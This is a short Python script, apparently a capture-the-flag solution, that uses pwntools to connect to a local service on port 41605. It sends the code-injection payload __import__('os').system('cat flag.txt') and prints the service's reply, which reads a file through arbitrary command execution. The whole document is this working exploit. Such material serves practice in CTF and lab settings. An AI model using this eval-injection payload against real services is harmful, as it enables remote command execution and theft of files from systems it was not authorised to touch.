from pwn import remote

r = remote('localhost',41605,level='error')
r.sendline(b"__import__('os').system('cat flag.txt')")
r.recvuntil(b':\n')
print(r.recvline().decode())
